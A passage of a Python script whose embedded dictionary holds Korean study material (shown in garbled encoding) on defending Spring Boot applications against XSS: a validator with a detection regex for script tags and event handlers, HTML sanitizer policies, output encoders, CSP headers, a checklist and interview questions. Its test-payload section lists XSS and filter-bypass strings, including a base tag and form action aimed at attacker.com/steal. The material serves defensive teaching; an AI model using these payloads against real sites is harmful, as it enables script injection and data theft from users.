                "content": "### XSS ë°©ì–´ ì•„í‚¤í…ì²˜\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    XSS ë‹¤ì¸µ ë°©ì–´ ì•„í‚¤í…ì²˜                        â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚   [ì‚¬ìš©ì ì…ë ¥]                                                  â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 1ï¸âƒ£ ì…ë ¥ ê²€ì¦ (Validation)                               â”‚\nâ”‚       â”‚    â””â”€â”€ íƒ€ì…/ê¸¸ì´/í˜•ì‹ ê²€ì¦                                â”‚\nâ”‚       â”‚    â””â”€â”€ ìœ„í—˜ íŒ¨í„´ í•„í„°ë§                                   â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [ì €ì¥/ì²˜ë¦¬]                                                    â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 2ï¸âƒ£ ì •í™” (Sanitization)                                  â”‚\nâ”‚       â”‚    â””â”€â”€ HTML Sanitizer ì ìš©                               â”‚\nâ”‚       â”‚    â””â”€â”€ í—ˆìš©ëœ íƒœê·¸ë§Œ ìœ ì§€                                 â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [ì¶œë ¥]                                                         â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 3ï¸âƒ£ ì¶œë ¥ ì¸ì½”ë”© (Encoding)                               â”‚\nâ”‚       â”‚    â””â”€â”€ ì»¨í…ìŠ¤íŠ¸ë³„ ì¸ì½”ë”©                                  â”‚\nâ”‚       â”‚    â””â”€â”€ HTML/JS/URL/CSS ê°ê° ë‹¤ë¥´ê²Œ                       â”‚\nâ”‚       â–¼                                                         â”‚\nâ”‚   [ë¸Œë¼ìš°ì €]                                                     â”‚\nâ”‚       â”‚                                                         â”‚\nâ”‚       â”‚ 4ï¸âƒ£ CSP (Content Security Policy)                        â”‚\nâ”‚       â”‚    â””â”€â”€ ì¸ë¼ì¸ ìŠ¤í¬ë¦½íŠ¸ ì°¨ë‹¨                               â”‚\nâ”‚       â”‚    â””â”€â”€ ìµœí›„ì˜ ë°©ì–´ì„                                      â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### ê³„ì¸µë³„ êµ¬í˜„ (Spring Boot 3.x)\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// 1ï¸âƒ£ ì…ë ¥ ê²€ì¦ ë ˆì´ì–´\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@RestController\n@Validated\npublic class CommentController {\n    \n    @PostMapping(\"/api/comments\")\n    public Comment createComment(\n            @Valid @RequestBody CommentRequest request) {\n        return commentService.create(request);\n    }\n}\n\npublic class CommentRequest {\n    \n    @NotBlank\n    @Size(max = 1000)\n    @SafeHtml  // ì»¤ìŠ¤í…€ ê²€ì¦ ì–´ë…¸í…Œì´ì…˜\n    private String content;\n    \n    // getter, setter\n}\n\n// ì»¤ìŠ¤í…€ SafeHtml ê²€ì¦ê¸°\n@Constraint(validatedBy = SafeHtmlValidator.class)\n@Target({ElementType.FIELD})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface SafeHtml {\n    String message() default \"í—ˆìš©ë˜ì§€ ì•ŠëŠ” HTMLì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤\";\n    Class<?>[] groups() default {};\n    Class<? extends Payload>[] payload() default {};\n}\n\npublic class SafeHtmlValidator implements ConstraintValidator<SafeHtml, String> {\n    \n    // ìœ„í—˜í•œ íŒ¨í„´ íƒì§€\n    private static final Pattern DANGEROUS = Pattern.compile(\n        \"(?i)\" +\n        \"(<script[^>]*>)\" +\n        \"|(javascript:)\" +\n        \"|(on\\\\w+\\\\s*=)\" +  // onclick, onerror ë“±\n        \"|(expression\\\\s*\\\\()\" +\n        \"|(vbscript:)\"\n    );\n    \n    @Override\n    public boolean isValid(String value, ConstraintValidatorContext context) {\n        if (value == null) return true;\n        return !DANGEROUS.matcher(value).find();\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// 2ï¸âƒ£ HTML Sanitizer ì„œë¹„ìŠ¤\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Service\npublic class HtmlSanitizerService {\n    \n    // ê¸°ë³¸ ì •ì±…: í…ìŠ¤íŠ¸ë§Œ í—ˆìš©\n    private final PolicyFactory TEXT_ONLY = new HtmlPolicyBuilder()\n        .toFactory();\n    \n    // ì œí•œì  HTML í—ˆìš© ì •ì±…\n    private final PolicyFactory BASIC_HTML = new HtmlPolicyBuilder()\n        .allowElements(\"p\", \"br\", \"b\", \"i\", \"u\", \"strong\", \"em\", \"ul\", \"ol\", \"li\")\n        .allowElements(\"a\")\n        .allowUrlProtocols(\"https\")\n        .allowAttributes(\"href\").onElements(\"a\")\n        .requireRelNofollowOnLinks()\n        .toFactory();\n    \n    // ì´ë¯¸ì§€ í¬í•¨ ì •ì±…\n    private final PolicyFactory WITH_IMAGES = new HtmlPolicyBuilder()\n        .allowElements(\"p\", \"br\", \"b\", \"i\", \"u\", \"strong\", \"em\", \"img\")\n        .allowUrlProtocols(\"https\")\n        .allowAttributes(\"src\", \"alt\").onElements(\"img\")\n        .allowAttributes(\"href\").onElements(\"a\")\n        .toFactory();\n    \n    public String sanitizeTextOnly(String html) {\n        return TEXT_ONLY.sanitize(html);\n    }\n    \n    public String sanitizeBasicHtml(String html) {\n        return BASIC_HTML.sanitize(html);\n    }\n    \n    public String sanitizeWithImages(String html) {\n        return WITH_IMAGES.sanitize(html);\n    }\n}\n```"
            },
            {
                "type": "code",
                "title": "ğŸ›¡ï¸ ì¶œë ¥ ì¸ì½”ë”© & CSP êµ¬í˜„",
                "content": "### ì»¨í…ìŠ¤íŠ¸ë³„ ì¶œë ¥ ì¸ì½”ë”©\n\n```java\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// 3ï¸âƒ£ ì»¨í…ìŠ¤íŠ¸ë³„ ì¸ì½”ë”© ìœ í‹¸ë¦¬í‹°\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Component\npublic class XssEncoder {\n    \n    // HTML ì»¨í…ìŠ¤íŠ¸ ì¸ì½”ë”©\n    public String encodeForHtml(String input) {\n        if (input == null) return null;\n        return input\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\")\n            .replace(\"'\", \"&#x27;\")\n            .replace(\"/\", \"&#x2F;\");\n    }\n    \n    // JavaScript ì»¨í…ìŠ¤íŠ¸ ì¸ì½”ë”©\n    public String encodeForJavaScript(String input) {\n        if (input == null) return null;\n        StringBuilder sb = new StringBuilder();\n        for (char c : input.toCharArray()) {\n            if (Character.isLetterOrDigit(c)) {\n                sb.append(c);\n            } else {\n                sb.append(String.format(\"\\\\u%04x\", (int) c));\n            }\n        }\n        return sb.toString();\n    }\n    \n    // URL íŒŒë¼ë¯¸í„° ì¸ì½”ë”©\n    public String encodeForUrl(String input) {\n        return URLEncoder.encode(input, StandardCharsets.UTF_8);\n    }\n    \n    // CSS ì»¨í…ìŠ¤íŠ¸ ì¸ì½”ë”©\n    public String encodeForCss(String input) {\n        if (input == null) return null;\n        StringBuilder sb = new StringBuilder();\n        for (char c : input.toCharArray()) {\n            if (Character.isLetterOrDigit(c)) {\n                sb.append(c);\n            } else {\n                sb.append(String.format(\"\\\\%06x\", (int) c));\n            }\n        }\n        return sb.toString();\n    }\n}\n\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n// 4ï¸âƒ£ CSP (Content Security Policy) ì„¤ì •\n// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n@Configuration\n@EnableWebSecurity\npublic class CspSecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .headers(headers -> headers\n                // ì—„ê²©í•œ CSP ì •ì±…\n                .contentSecurityPolicy(csp -> csp\n                    .policyDirectives(buildCspPolicy())\n                )\n                // í´ë¦­ì¬í‚¹ ë°©ì§€\n                .frameOptions(frame -> frame.deny())\n                // MIME íƒ€ì… ìŠ¤ë‹ˆí•‘ ë°©ì§€\n                .contentTypeOptions(Customizer.withDefaults())\n            );\n        return http.build();\n    }\n    \n    private String buildCspPolicy() {\n        return String.join(\"; \",\n            \"default-src 'self'\",\n            \"script-src 'self' 'strict-dynamic'\",  // ì—„ê²©í•œ ìŠ¤í¬ë¦½íŠ¸ ì •ì±…\n            \"style-src 'self' 'unsafe-inline'\",     // ìŠ¤íƒ€ì¼ì€ ì¸ë¼ì¸ í—ˆìš©\n            \"img-src 'self' data: https:\",\n            \"font-src 'self' https://fonts.gstatic.com\",\n            \"connect-src 'self' https://api.example.com\",\n            \"frame-ancestors 'none'\",\n            \"form-action 'self'\",\n            \"base-uri 'self'\",\n            \"upgrade-insecure-requests\"\n        );\n    }\n}\n\n// Nonce ê¸°ë°˜ CSP (ë” ì•ˆì „)\n@Component\npublic class CspNonceFilter extends OncePerRequestFilter {\n    \n    @Override\n    protected void doFilterInternal(HttpServletRequest request,\n            HttpServletResponse response, FilterChain chain) \n            throws ServletException, IOException {\n        \n        // ìš”ì²­ë§ˆë‹¤ ëœë¤ nonce ìƒì„±\n        String nonce = generateNonce();\n        request.setAttribute(\"cspNonce\", nonce);\n        \n        // CSP í—¤ë”ì— nonce í¬í•¨\n        String cspHeader = String.format(\n            \"default-src 'self'; script-src 'self' 'nonce-%s'; \" +\n            \"style-src 'self' 'nonce-%s'\",\n            nonce, nonce\n        );\n        response.setHeader(\"Content-Security-Policy\", cspHeader);\n        \n        chain.doFilter(request, response);\n    }\n    \n    private String generateNonce() {\n        byte[] nonceBytes = new byte[16];\n        new SecureRandom().nextBytes(nonceBytes);\n        return Base64.getEncoder().encodeToString(nonceBytes);\n    }\n}\n```\n\n### Thymeleafì—ì„œ nonce ì‚¬ìš©\n\n```html\n<!-- templates/page.html -->\n<!DOCTYPE html>\n<html xmlns:th=\"http://www.thymeleaf.org\">\n<head>\n    <!-- nonceê°€ ìˆëŠ” ìŠ¤í¬ë¦½íŠ¸ë§Œ ì‹¤í–‰ë¨ -->\n    <script th:attr=\"nonce=${cspNonce}\">\n        // ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ì‹¤í–‰ë¨\n        console.log('Allowed script');\n    </script>\n</head>\n<body>\n    <!-- XSSë¡œ ì£¼ì…ëœ ìŠ¤í¬ë¦½íŠ¸ëŠ” nonceê°€ ì—†ì–´ì„œ ì°¨ë‹¨ë¨ -->\n    <!-- <script>alert('XSS')</script> ì‹¤í–‰ ì•ˆë¨! -->\n</body>\n</html>\n```"
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ & ë©´ì ‘",
                "content": "### ì‹¤ë¬´ ì²´í¬ë¦¬ìŠ¤íŠ¸ (ìƒì„¸)\n\n```\n[ ì…ë ¥ ê²€ì¦ - í•„ìˆ˜ ]\nâ–¡ ëª¨ë“  ì‚¬ìš©ì ì…ë ¥ ê²€ì¦\nâ–¡ íƒ€ì…, ê¸¸ì´, í˜•ì‹ ì²´í¬\nâ–¡ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ ê²€ì¦\nâ–¡ ìœ„í—˜ íŒ¨í„´ íƒì§€ (script, onclick ë“±)\n\n[ ì¶œë ¥ ì¸ì½”ë”© - í•„ìˆ˜ ]\nâ–¡ HTML ì»¨í…ìŠ¤íŠ¸: &lt; &gt; ì¸ì½”ë”©\nâ–¡ JavaScript ì»¨í…ìŠ¤íŠ¸: \\u ì¸ì½”ë”©\nâ–¡ URL ì»¨í…ìŠ¤íŠ¸: URL ì¸ì½”ë”©\nâ–¡ CSS ì»¨í…ìŠ¤íŠ¸: \\ ì¸ì½”ë”©\nâ–¡ í…œí”Œë¦¿ ì—”ì§„ ìë™ ì´ìŠ¤ì¼€ì´í”„ í™•ì¸\n\n[ CSP ì„¤ì • - ê°•ë ¥ ê¶Œì¥ ]\nâ–¡ default-src 'self'\nâ–¡ script-srcì— 'unsafe-inline' ê¸ˆì§€\nâ–¡ nonce ë˜ëŠ” hash ê¸°ë°˜ ìŠ¤í¬ë¦½íŠ¸ í—ˆìš©\nâ–¡ report-urië¡œ ìœ„ë°˜ ëª¨ë‹ˆí„°ë§\n\n[ ì¶”ê°€ ë³´ì•ˆ í—¤ë” ]\nâ–¡ X-Content-Type-Options: nosniff\nâ–¡ X-Frame-Options: DENY\nâ–¡ Referrer-Policy: strict-origin-when-cross-origin\n\n[ í”„ë¡ íŠ¸ì—”ë“œ ]\nâ–¡ innerHTML ëŒ€ì‹  textContent ì‚¬ìš©\nâ–¡ React: dangerouslySetInnerHTML ê¸ˆì§€ ë˜ëŠ” sanitize\nâ–¡ Vue: v-html ê¸ˆì§€ ë˜ëŠ” sanitize\nâ–¡ jQuery: .html() ëŒ€ì‹  .text() ì‚¬ìš©\n```\n\n### ë©´ì ‘ ì˜ˆìƒ ì§ˆë¬¸\n\n```\nğŸ‘¶ ì£¼ë‹ˆì–´ ë ˆë²¨:\nQ: XSSë¥¼ ë°©ì–´í•˜ëŠ” ê°€ì¥ ê¸°ë³¸ì ì¸ ë°©ë²•ì€?\nA: ì¶œë ¥ ì‹œ HTML ì¸ì½”ë”©ì…ë‹ˆë‹¤. <ë¥¼ &lt;ë¡œ, >ë¥¼ &gt;ë¡œ\n   ë³€í™˜í•˜ë©´ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\n\nQ: innerHTMLì´ ì™œ ìœ„í—˜í•œê°€ìš”?\nA: innerHTMLì€ ë¬¸ìì—´ì„ HTMLë¡œ í•´ì„í•˜ì—¬ ì‚½ì…í•˜ë¯€ë¡œ\n   ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. textContentë‚˜\n   í”„ë ˆì„ì›Œí¬ì˜ ìë™ ì´ìŠ¤ì¼€ì´í”„ ê¸°ëŠ¥ì„ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.\n\nğŸ‘¨â€ğŸ’¼ ì‹œë‹ˆì–´ ë ˆë²¨:\nQ: CSPì˜ nonceì™€ hash ë°©ì‹ì˜ ì°¨ì´ì ì€?\nA: nonceëŠ” ìš”ì²­ë§ˆë‹¤ ì„œë²„ì—ì„œ ìƒì„±í•œ ëœë¤ê°’ì„ ì‚¬ìš©í•˜ê³ ,\n   hashëŠ” ìŠ¤í¬ë¦½íŠ¸ ë‚´ìš©ì˜ í•´ì‹œê°’ì„ ë¯¸ë¦¬ ë“±ë¡í•©ë‹ˆë‹¤.\n   nonceëŠ” ë™ì  ìŠ¤í¬ë¦½íŠ¸ì—, hashëŠ” ì •ì  ìŠ¤í¬ë¦½íŠ¸ì— ì í•©í•©ë‹ˆë‹¤.\n\nQ: Stored XSSì™€ Reflected XSS ë°©ì–´ ì „ëµì˜ ì°¨ì´ëŠ”?\nA: ë‘˜ ë‹¤ ì¶œë ¥ ì¸ì½”ë”©ì´ ê¸°ë³¸ì´ì§€ë§Œ, Stored XSSëŠ” ì €ì¥ ì‹œì ì—\n   sanitizeí•˜ë©´ ì¶”ê°€ ë°©ì–´ê°€ ë˜ê³ , Reflected XSSëŠ”\n   URL íŒŒë¼ë¯¸í„° ê²€ì¦ì— ì§‘ì¤‘í•©ë‹ˆë‹¤.\n```\n\n### í…ŒìŠ¤íŠ¸ í˜ì´ë¡œë“œ\n\n```html\n<!-- ê¸°ë³¸ í…ŒìŠ¤íŠ¸ -->\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n<!-- ì¸ì½”ë”© ìš°íšŒ -->\n&#60;script&#62;alert(1)&#60;/script&#62;\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n\n<!-- CSP ìš°íšŒ ì‹œë„ -->\n<base href=\"https://attacker.com/\">\n<form action=\"https://attacker.com/steal\">\n\n<!-- DOM ê¸°ë°˜ -->\n#<img src=x onerror=alert(1)>\n?name=<script>alert(1)</script>\n```"
            }
        ]
    },

    # ===========================================
    # ë³‘í•© ëŒ€ìƒ (sql-injection-prevention, xss-prevention)
    # ì´ í‚¤ë“¤ì€ sql-injection-prevent, xss-preventë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸
    # ===========================================
    "02_ê³µê²©/sql-injection-prevention": {
        "title": "SQL ì¸ì ì…˜ ë°©ì–´ (sql-injection-prevent ì°¸ì¡°)",
        "description": "SQL ì¸ì ì…˜ ë°©ì–´ì— ëŒ€í•œ ë‚´ìš©ì€ sql-injection-preventë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ”— SQL Injection Prevention",
                "content": "## ì•ˆë‚´\n\nì´ í† í”½ì˜ ë‚´ìš©ì€ **sql-injection-prevent**ë¡œ í†µí•©ë˜ì—ˆìŠµë‹ˆë‹¤.\n\n### í†µí•©ëœ ë‚´ìš©\n- SQL Injection ë‹¤ì¸µ ë°©ì–´ ì „ëµ\n- PreparedStatement ì‚¬ìš©ë²•\n- ì…ë ¥ê°’ ê²€ì¦ ë° í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸\n- DB ë ˆë²¨ ìµœì†Œ ê¶Œí•œ ì„¤ì •\n- WAF ë° ëª¨ë‹ˆí„°ë§\n\nâ†’ **sql-injection-prevent** í† í”½ì—ì„œ ìƒì„¸ ë‚´ìš©ì„ í™•ì¸í•˜ì„¸ìš”."
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì°¸ì¡°",
                "content": "### ê´€ë ¨ í† í”½\n\n```\nğŸ“Œ sql-injection\n   â””â”€â”€ SQL Injection ê³µê²© ì›ë¦¬\n\nğŸ“Œ sql-injection-prevent (â˜… ë©”ì¸)\n   â””â”€â”€ SQL Injection ë°©ì–´ ì™„ë²½ ê°€ì´ë“œ\n   â””â”€â”€ ë‹¤ì¸µ ë°©ì–´ ì „ëµ\n   â””â”€â”€ ì½”ë“œ/DB/ì¸í”„ë¼ ë ˆë²¨ ë°©ì–´\n```"
            }
        ]
    },

    "02_ê³µê²©/xss-prevention": {
        "title": "XSS ë°©ì–´ (xss-prevent ì°¸ì¡°)",
        "description": "XSS ë°©ì–´ì— ëŒ€í•œ ë‚´ìš©ì€ xss-preventë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.",
        "sections": [
            {
                "type": "concept",
                "title": "ğŸ”— XSS Prevention",
                "content": "## ì•ˆë‚´\n\nì´ í† í”½ì˜ ë‚´ìš©ì€ **xss-prevent**ë¡œ í†µí•©ë˜ì—ˆìŠµë‹ˆë‹¤.\n\n### í†µí•©ëœ ë‚´ìš©\n- XSS ë‹¤ì¸µ ë°©ì–´ ì „ëµ\n- ì…ë ¥ ê²€ì¦ ë° Sanitization\n- ì¶œë ¥ ì¸ì½”ë”© (ì»¨í…ìŠ¤íŠ¸ë³„)\n- CSP (Content Security Policy)\n- ë³´ì•ˆ í—¤ë” ì„¤ì •\n\nâ†’ **xss-prevent** í† í”½ì—ì„œ ìƒì„¸ ë‚´ìš©ì„ í™•ì¸í•˜ì„¸ìš”."
            },
            {
                "type": "tip",
                "title": "ğŸ’¡ ì°¸ì¡°",
                "content": "### ê´€ë ¨ í† í”½\n\n```\nğŸ“Œ xss\n   â””â”€â”€ XSS ê³µê²© ì›ë¦¬\n\nğŸ“Œ xss-prevent (â˜… ë©”ì¸)\n   â””â”€â”€ XSS ë°©ì–´ ì™„ë²½ ê°€ì´ë“œ\n   â””â”€â”€ ì…ë ¥ ê²€ì¦ + ì¶œë ¥ ì¸ì½”ë”© + CSP\n   â””â”€â”€ í”„ë¡ íŠ¸ì—”ë“œ/ë°±ì—”ë“œ ë°©ì–´\n```"
            }
        ]
    }
}


def update_security_json():
    """security.json íŒŒì¼ ì—…ë°ì´íŠ¸"""
    sys.stdout.reconfigure(encoding='utf-8')

    # íŒŒì¼ ì½ê¸°
    with open(SECURITY_JSON_PATH, 'r', encoding='utf-8') as f:
        data = json.load(f)

    updated_count = 0
    not_found = []

    for key, content in SECURITY_CONTENTS.items():
        if key in data:
            data[key]['title'] = content['title']
            data[key]['description'] = content['description']
            data[key]['sections'] = content['sections']
            data[key]['isPlaceholder'] = False
            updated_count += 1
            print(f"[OK] {key} updated")
        else:
            not_found.append(key)
            print(f"[WARN] {key} key not found")

    # íŒŒì¼ ì €ì¥
    with open(SECURITY_JSON_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    print(f"\n[DONE] Security content updated: {updated_count} topics")
    if not_found:
        print(f"[WARN] Not found keys: {not_found}")


if __name__ == "__main__":
    update_security_json()
